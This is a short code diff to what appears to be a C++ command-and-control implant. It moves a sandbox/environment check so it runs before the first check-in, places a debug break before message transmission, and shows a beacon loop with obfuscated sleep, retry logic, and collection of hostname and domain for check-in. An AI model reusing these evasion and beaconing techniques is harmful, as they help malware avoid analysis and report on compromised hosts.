@@ -17,11 +17,6 @@ namespace Core {
             return_defer(ntstatus);
         }
 
-        SeCheckEnvironment();
-        if (ntstatus == ERROR_BAD_ENVIRONMENT) {
-            return_defer(ntstatus);
-        }
-
         do {
             SleepObf();
 
@@ -29,16 +24,26 @@ namespace Core {
                 continue;
             }
 
+            if (!Ctx->Session.Checkin) {
+                SeCheckEnvironment();
+                if (ntstatus == ERROR_BAD_ENVIRONMENT) {
+                    return_defer(ntstatus);
+                }
+            }
+
+            __debugbreak();
             MessageTransmit();
             if (ntstatus != ERROR_SUCCESS) {
                 Ctx->Session.Retry++;
                 if (Ctx->Session.Retry == 3) {
                     break;
                 }
-            } else {
+            }
+            else {
                 Ctx->Session.Retry = 0;
             }
-        } while (TRUE);
+        }
+        while (TRUE);
 
     defer:
         FreeApi(Ctx);
@@ -263,7 +268,6 @@ namespace Core {
 
         //XteaCrypt(B_PTR(Parser.Handle), Parser.Length, Ctx->Config.Key, FALSE);
 
-        __debugbreak();
         ParserStrcpy(&Parser, &Ctx->Config.Hostname);
         ParserStrcpy(&Parser, &Ctx->Config.Domain);
 
